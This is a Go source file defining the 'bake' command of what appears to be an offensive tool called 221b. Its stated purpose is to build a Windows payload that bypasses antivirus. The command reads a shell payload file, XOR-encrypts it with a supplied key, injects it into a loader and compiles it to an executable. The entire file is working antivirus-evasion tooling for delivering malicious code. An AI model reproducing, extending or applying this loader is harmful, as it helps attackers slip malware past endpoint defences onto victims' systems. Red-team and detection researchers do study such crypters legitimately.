package cli

import (
	"fmt"
	"github.com/spf13/cobra"
	"os"
	"path/filepath"
	"strings"

	"github.com/cmepw/221b/encryption/xor"
	"github.com/cmepw/221b/loader"
	"github.com/cmepw/221b/logger"
)

var (
	shellPath string
	key       string
	output    string
)

var (
	ErrMissingShellPath = fmt.Errorf("missing shellPath argument")
	ErrMissingKey       = fmt.Errorf("missing key argument")
)

var bake = &cobra.Command{
	Use:   "bake",
	Short: "Build a windows payload with the given shell encrypted in it to bypass AV",
	Run: func(cmd *cobra.Command, args []string) {
		if shellPath == "" {
			logger.Fatal(ErrMissingShellPath)
		}

		if key == "" {
			logger.Fatal(ErrMissingKey)
		}

		if output == "" {
			output = strings.TrimSuffix(filepath.Base(shellPath), filepath.Ext(shellPath)) + loader.WindowsExt
			logger.Warn(fmt.Sprintf("output path set to default: %s", output))
		}

		logger.Debug(fmt.Sprintf("baking %s with key %s", shellPath, key))

		logger.Debug(fmt.Sprintf("reading %s", shellPath))
		file, err := os.ReadFile(shellPath)
		if err != nil {
			logger.Fatal(err)
		}

		logger.Debug(fmt.Sprintf("encrypting %s", shellPath))
		encryptedShell := xor.Encrypt(file, []byte(key))

		logger.Debug(fmt.Sprintf("injecting encrypted shell into payload"))

		xorLoader := loader.NewXorLoader([]byte(key))
		content, err := xorLoader.Load(encryptedShell)
		if err != nil {
			logger.Fatal(err)
		}

		if logger.DebugMode {
			logger.Debug("content")
			fmt.Println(string(content))
		}

		if err := xorLoader.Compile(output, content); err != nil {
			logger.Fatal(err)
		}
	},
}

func init() {
	bake.Flags().StringVarP(&shellPath, "shellPath", "s", "", "path to the shell scrypt")
	bake.Flags().StringVarP(&key, "key", "k", "", "key to use for the xor")
	bake.Flags().StringVarP(&output, "output", "o", "", "output path (e.g., /home/bin.exe)")
}
